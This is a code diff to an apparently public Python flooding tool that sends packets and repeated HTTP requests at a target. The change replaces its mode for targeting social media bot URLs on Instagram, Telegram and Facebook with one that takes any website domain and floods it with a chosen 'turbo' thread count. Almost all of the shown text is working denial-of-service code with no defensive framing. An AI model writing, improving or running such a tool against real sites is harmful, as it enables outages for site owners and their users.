@@ -1,6 +1,5 @@
 #!/bin/python3
 # -*- coding: utf-8 -*-
-
 """
 Coded by parsa kazazi
 @parsa_kazazi (Github, Twitter)
@@ -15,6 +14,7 @@ import sys
 import os
 import socket
 import urllib.request
+import urllib
 import threading
 import time
 import random
@@ -108,7 +108,7 @@ def main():
     info = str("\033[94m[i]\033[0m ")
     good = str("\033[92m[+]\033[0m ")
     error = str("\033[91m[-]\033[0m ")
-    print("\nSelect Attack mode\n\n    1- Domain or IP address (UDP packet send)\n    2- Social media bot (http request send)\n")
+    print("\nSelect Attack mode\n\n    1- Packet Send\n    2- HTTP Request Send\n")
     attack_modes = ["1", "2"]
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # to create connection
     attack_mode = input(question + "Attack mode : ")
@@ -163,34 +163,20 @@ def main():
             os.system("printf '\033]2;Attacking to " + address + "\a'")
      
     elif (attack_mode == "2"):
-        print("\nSelect social media")
-        print("\n    1- Instagram\n    2- Telegram\n    3- Facebook\n")
-        social_media_list = ["1", "2", "3"]
-        social_media = input(question + ": ")
-        if (social_media not in social_media_list):
-            print(error + "Invailed input")
-            sys.exit(0)
-        bot_username = input(question +"Bot username account : ")
-        thread_count = input(question + "Thread count : ")
+        domain = input(question +"Website Domain : ") # domain. exsample : google.com
+        thread_count = input(question + "Turbo count : ") # number of thread count
         try:
             thread_count = int(thread_count)
         except ValueError:
             print(error + "Invailed input")
             sys.exit(0)
         udp_port = 80
-        if (social_media == "1"):
-            url = str("http://instagram.com/" + bot_username)
-            social_media = "Instagram"
-        elif (social_media == "2"):
-            url = str("http://telegram.me/" + bot_username)
-            social_media = "Telegram"
-        elif (social_media == "3"):
-            url = str("http://facebook.com/" + bot_username)
-            social_media = "Facebook"
-        print(info + "Checking connection to " + url + " ...")
+        print(info + "Checking connection to " + domain + " ...")
         time.sleep(3)
         try:
-            urllib.request.urlopen(url) # connect to bot url
+            url = str("http://" + domain + "/")
+            urllib.request.urlopen(url) # connect to Website url
+            ip = socket.gethostbyname(domain)
         except socket.gaierror:
             print(error + "Name or service not known\n")
             sys.exit(0)
@@ -220,17 +206,17 @@ def main():
             os.system("cls")
         else:
             os.system("clear")
-        print(info + "Bot username ...........: " + bot_username)
-        print(info + "Social media ...........: " + social_media)
-        print(info + "Full bot url ...........: " + url)
+        print(info + "Website domain..........: " + domain)
+        print(info + "Website ip address .....: " + ip)
+        print(info + "Correct URL ............: " + url)
         print(info + "Attack turbo count .....: " + str(thread_count))
         input("\n" + good + "Press Enter to continue ")
         print(info + "For stop attack press CTRL+C\n")
         time.sleep(5)
         if (os_name == "nt"):
-            os.system("title Attacking to " + bot_username)
+            os.system("title Attacking to " + domain)
         else:
-            os.system("printf '\033]2;Attacking to " + bot_username + "\a'")
+            os.system("printf '\033]2;Attacking to " + domain + "\a'")
 
     def packet_send():
         # send packet to ip address
@@ -265,7 +251,7 @@ Accept-Language: en-US,en;q=0.9
                 print(error + now_time + " ==> Connection Reset")
     
     def request_send():
-        # send request to bot url
+        # send request to Website URL
         while True:
             try:
                 now_time = str(time.strftime("%Y-%m-%d %H:%M:%S"))
